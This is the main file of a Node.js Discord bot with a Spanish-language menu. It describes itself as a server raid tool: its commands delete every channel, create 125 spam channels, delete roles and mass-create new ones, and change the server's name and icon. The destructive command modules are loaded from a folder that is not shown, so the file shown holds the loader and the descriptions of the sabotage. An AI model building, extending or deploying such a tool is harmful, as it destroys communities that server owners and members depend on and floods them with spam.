const Discord = require("discord.js");
const fs = require('fs');
const chalk = require('chalk');
const { green } = require('chalk');
const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});



const client = new Discord.Client();
client.commands = new Discord.Collection();

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));

const {
    prefix,
    token,
} = require('./config.json');
client.once('ready', () => { help()
    console.log(chalk.red(`
     ▄▄▄·▄▄▌        ▐▄• ▄ ▐▄• ▄ 
    ▐█ ▄███•  ▪      █▌█▌▪ █▌█▌▪
     ██▀·██▪   ▄█▀▄  ·██·  ·██· 
    ▐█▪·•▐█▌▐▌▐█▌.▐▌▪▐█·█▌▪▐█·█▌
    .▀   .▀▀▀  ▀█▄▀▪•▀▀ ▀▀•▀▀ ▀▀   


    |.on|                  |.raid|
    |.roles|            |.seticon|
             |.setname| 
             
    Duda con algun comando? Escribelo!
    `
    ))
    function help(){
        readline.question('', comando => {
            if (comando === '.on') {
                console.log(chalk.red('Borra todos los canales y crea uno'))}
            if (comando === '.raid') {
                console.log(chalk.red('Crea 125 canales con spam'))} 
            if (comando === '.roles') {
                console.log(chalk.red('Borra todos los roles por debajo del bot y crea 75 nuevos'))}
            if (comando === '.seticon') {
                console.log(chalk.red('Cambia el icono del server'))} 
            if (comando === '.setname') {
                console.log(chalk.red('Cambia el nombre del servidor'))} 
                help()
            
        })
    }}

    
);

client.login(token);

for (const file of commandFiles) {
    const command = require(`./commands/${file}`);
    client.commands.set(command.name, command);
}
client.on('message', message => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if(!client.commands.has(command)) return;
    try{
        client.commands.get(command).execute(message, args);
    }catch(error){
        console.error(error);
        message.reply("Hubo un problema al ejecutar ese comando");
    }
});
